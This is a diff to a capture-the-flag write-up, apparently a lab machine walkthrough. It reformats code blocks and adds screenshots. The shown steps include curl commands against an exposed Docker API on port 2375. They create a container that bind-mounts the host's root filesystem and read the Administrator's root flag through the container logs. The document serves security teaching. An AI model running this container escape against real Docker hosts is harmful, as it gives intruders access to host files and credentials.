@@ -235,7 +235,8 @@ Discovery: Actual path is /mnt/host_root/parent-distro/mnt/host/c/Users/Administ
 **Result:** Root flag retrieved from `/mnt/host_root/Users/Administrator/Desktop/root.txt`
 
 ```
-## Read root flag with the path : 
+ 4. Read root flag with the path : 
+```
 curl -H "Content-Type: application/json" \
   -d '{"Image":"alpine:latest","Cmd":["cat","/mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/:/mnt/host_root"]}}' \
   [http://192.168.65.7](http://192.168.65.7):2375/containers/create
@@ -244,6 +245,7 @@ cid_root=<NEW_CONTAINER_ID>
 curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/start
 sleep 2
 curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/logs?stdout=true&stderr=true" 2>/dev/null | strings
+```
 ---
 
 ## 5. Flags
@@ -253,6 +255,10 @@ Located at: `/home/marcus/user.txt` (inside the Docker container)
 
 ### Root Flag
 Located at: `C:\Users\Administrator\Desktop\root.txt` on the Windows host, accessible via Docker API exec as `/mnt/host_root/Users/Administrator/Desktop/root.txt`
+
+<img width="1141" height="156" alt="image" src="https://github.com/user-attachments/assets/07adb8b2-cbcd-461e-8d8c-bd9c4547ffc2" />
+
+<img width="1200" height="837" alt="image" src="https://github.com/user-attachments/assets/e406e6be-0306-4fcd-8130-9df780a58267" />
 
 ---
 
